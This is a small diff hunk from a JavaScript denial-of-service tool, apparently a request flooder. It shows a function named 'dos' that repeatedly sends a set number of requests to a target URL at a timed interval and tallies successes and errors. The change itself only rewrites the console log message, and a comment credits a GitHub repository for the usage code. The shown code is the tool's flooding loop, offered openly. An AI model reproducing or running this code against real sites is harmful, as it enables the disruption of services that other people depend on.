@@ -39,9 +39,8 @@ const dos = (url, qty, ms) => {
     setInterval(_ => {
 
         for (let i = qty; i--;)
-
             req(url, error => !error ? ok++ : err++)
-            console.log(`result:' ${ok} ${err}`)
+            console.log(`[*] Sending => Send :${ok} / Error: ${err}`)
             err = ok = 0
 
     }, ms) //Usage Code example: https://github.com/u4bi-store/dos/blob/master/index.js thanks :) 
